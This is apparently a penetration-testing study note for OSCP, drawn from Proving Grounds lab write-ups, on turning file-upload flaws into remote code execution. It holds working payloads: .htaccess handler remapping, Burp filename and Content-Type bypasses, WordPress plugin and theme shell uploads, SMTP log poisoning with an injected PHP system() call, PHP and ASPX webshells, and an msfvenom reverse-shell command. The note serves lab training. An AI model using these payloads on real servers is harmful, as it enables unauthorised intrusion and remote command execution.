---
title: "File Upload → RCE Patterns — Bypass Techniques and Attack Chains"
created: "2026-04-11"
updated: "2026-04-11"
type: permanent-note
status: active
tags:
  - permanent-note
  - file-upload
  - rce
  - web-attacks
  - burp
  - oscp
related:
  - "[[File-Upload-Filter-Bypass-Techniques]]"
  - "[[Reverse-Shell-Reference]]"
  - "[[Web-Directory-Enumeration]]"
  - "[[LFI-to-RCE-Log-Poisoning-Pattern]]"
---

# File Upload → RCE Patterns — Bypass Techniques and Attack Chains

**Core idea:** Unrestricted file upload is one of the most reliable web exploitation paths. The goal is always to get a PHP (or ASPX) file executed by the web server. Every protection — extension whitelist, MIME check, double extension filtering — has a bypass. This note documents the specific patterns seen in Proving Grounds writeups.

> See [[File-Upload-Filter-Bypass-Techniques]] for the full reference on evasion methods.

---

## The Core Attack Chain

```
1. Find upload endpoint    → directory enumeration → /uploads/, /images/, admin panel
2. Identify protection     → what file types are accepted? MIME check? Extension filter?
3. Select bypass           → double extension, .htaccess, magic bytes, Burp intercept
4. Upload shell            → PHP webshell or full reverse shell
5. Find the file           → what path is it stored at?
6. Trigger execution       → GET request → command output → reverse shell
```

---

## Pattern 1: .htaccess Upload Bypass (Access Box)

**Situation:** Server only accepts specific extensions (e.g., no `.php`). But you can upload `.htaccess`.

**Attack:**
```bash
# Step 1: Upload a .htaccess file that remaps .evil → php
# Content of .htaccess:
AddType application/x-httpd-php .evil

# Step 2: Upload your shell as shell.evil
# The server now executes .evil files as PHP

# Step 3: Trigger
curl http://TARGET/uploads/shell.evil?cmd=id
```

**Key insight:** If the upload system accepts `.htaccess`, you can completely change how the web server interprets other files in that directory. A single `.htaccess` upload unlocks arbitrary PHP execution.

---

## Pattern 2: Double Extension + Burp Intercept (Photographer, Access)

**Situation:** Server validates extension client-side OR checks only the last extension.

**Attack using Burp Suite:**
```
1. Create file: image.php.jpg
2. Upload it — server accepts because it sees .jpg
3. Intercept in Burp Repeater
4. Change filename in request: image.php.jpg → image.php
5. Forward → file is stored as image.php
6. Navigate to /storage/originals/f2/10/image.php?cmd=id
```

**Alternative — change Content-Type only:**
```
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg    ← change this from application/octet-stream
```

---

## Pattern 3: CMS Plugin/Theme Upload (WordPress, Stapler)

**When:** You have WordPress admin credentials.

**Attack:**
```
1. Login to /wp-admin/
2. Plugins → Add New → Upload Plugin
3. Upload a .zip containing a PHP reverse shell
   (pentest monkey shell wrapped in plugin structure)
4. Navigate to:
   /wp-content/uploads/FILENAME.php
   OR activate the plugin to trigger execution
```

**For WordPress themes:**
```
Appearance → Theme Editor → Select a theme file (404.php)
Replace content with PHP shell → Save → Navigate to /wp-content/themes/THEME/404.php
```

---

## Pattern 4: CMS Import/Content Upload (Koken CMS, Photographer)

**CVE:** Koken CMS 0.22.24 — Authenticated Arbitrary File Upload
```
1. Login to Koken admin (Library → Content → Import Content)
2. Create file: image.php.jpg (PHP shell with .jpg extension)
3. Upload normally
4. Intercept with Burp — change filename to image.php
5. Navigate to storage location → trigger shell
```

---

## Pattern 5: SMTP Log Injection → PHP Log Poisoning

```bash
# ClamAV/Sendmail: the SMTP service writes to a log that's web-accessible
# Inject PHP into SMTP DATA
nc TARGET 25
EHLO test
MAIL FROM: test@test.com
RCPT TO: www-data
DATA
<?php system($_GET['cmd']); ?>
.
QUIT

# Include the log via LFI
curl "http://TARGET/page.php?file=/var/log/mail.log&cmd=id"
```

---

## Finding the Uploaded File Path

After uploading, the file could be at:
```
/uploads/filename.php
/upload/filename.php
/files/filename.php
/assets/filename.php
/storage/originals/XY/ZW/filename.php    (Koken CMS)
/wp-content/uploads/filename.php         (WordPress)
/var/www/html/uploads/filename.php       (Apache default)
/xampp/htdocs/uploads/filename.php       (Windows XAMPP)
```

**Tip:** After uploading, look at the server's response — it often includes the full path to the stored file in the JSON response or page redirect.

---

## PHP Webshell Options

```php
# Minimal webshell — check execution first
<?php echo system($_GET['cmd']); ?>

# With passthru for binary output
<?php passthru($_GET['cmd']); ?>

# Full reverse shell (pentest monkey)
# https://github.com/pentestmonkey/php-reverse-shell
# Edit: $ip = 'KALI_IP'; $port = PORT;
```

---

## ASPX Shell (Windows Targets)

```aspx
<%@ Page Language="C#" %>
<%
    System.Diagnostics.Process.Start("cmd.exe", "/c "+Request["cmd"])
        .WaitForExit();
%>
```

Or use msfvenom:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=PORT -f aspx -o shell.aspx
```

---

## Connections

- [[File-Upload-Filter-Bypass-Techniques]] — comprehensive bypass reference
- [[Reverse-Shell-Reference]] — shell code to put inside the uploaded files
- [[Web-Directory-Enumeration]] — finding the upload endpoint and the stored file
- [[LFI-to-RCE-Log-Poisoning-Pattern]] — alternative RCE path via log files
- [[SSTI-Jinja2-Exploitation]] — template injection as alternative to file upload RCE

---

*Key boxes: Access (.htaccess bypass), Photographer (Koken CMS), Stapler (WordPress plugin), DriftingBlues6 (zip/fcrackzip + CMS upload)*
*Extracted from 70+ Proving Grounds writeups (PG Play + PG Practice, 2023–2024)*
